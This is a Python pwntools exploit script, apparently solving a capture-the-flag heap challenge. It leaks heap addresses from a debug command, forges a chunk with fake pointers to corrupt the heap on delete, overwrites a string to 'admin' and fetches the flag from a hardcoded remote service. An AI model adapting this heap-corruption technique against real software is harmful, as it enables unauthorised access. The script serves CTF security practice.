#!/usr/bin/env python3
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("143.244.138.133", 8002)
    else:
        p = elf.process()

context.binary = elf = ELF("./heap")
libc = elf.libc

start()

p.recvlines(4)
p.sendline("tiny")

p.recvlines(2)
p.sendline("new")
p.recvlines(2)
p.sendline("raj")
p.recvlines(4)
p.sendline("new")
p.recvlines(2)
p.sendline("raj")

p.recvlines(4)
p.sendline("debug")
leaks = p.recvlines(9)

victim_string = int(leaks[4].split(b": ")[-1], 16)
chunk0_ptr = int(leaks[5].split(b": ")[-1], 16)

print(hex(victim_string))

p.recvlines(2)
p.sendline('edit')
p.recvlines(2)
p.sendline('1')
p.recvlines(2)
p.sendline(p64(0) + p64(0x421) + p64(chunk0_ptr - 8*3) + p64(chunk0_ptr - 8*2) + b'\x00'*(0x420 - 8*4) + p64(0x420) + p64(0x430))

p.recvlines(4)
p.sendline("delete")

p.recvlines(4)
p.sendline("edit")
p.recvlines(2)
p.sendline(p64(0) + p64(1) + p64(0) + p64(victim_string))

p.sendline("edit")
p.recvlines(2)
p.sendline("admin\0")

p.recvlines(8)
p.sendline("flag")

p.interactive()
p.close()
